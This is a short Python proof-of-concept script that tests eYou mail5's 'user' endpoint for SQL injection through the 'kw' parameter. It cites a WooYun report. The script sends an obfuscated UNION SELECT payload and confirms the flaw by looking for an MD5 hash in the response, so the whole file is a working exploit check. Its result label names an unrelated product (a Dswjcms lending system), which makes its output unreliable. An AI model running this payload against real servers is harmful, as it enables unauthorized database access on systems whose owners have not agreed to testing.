#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 亿邮mail5 user 参数kw SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-074260
author: Lucifer
description: 文件user中,参数kw存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['Dswjcms p2p网贷系统前台4处sql注入', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/user/?q=help&type=search&page=1&kw=-1%22)UnIoN/**/AlL/**/SeLeCt/**/1,2,3,Md5(1234),5,6,7%23"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    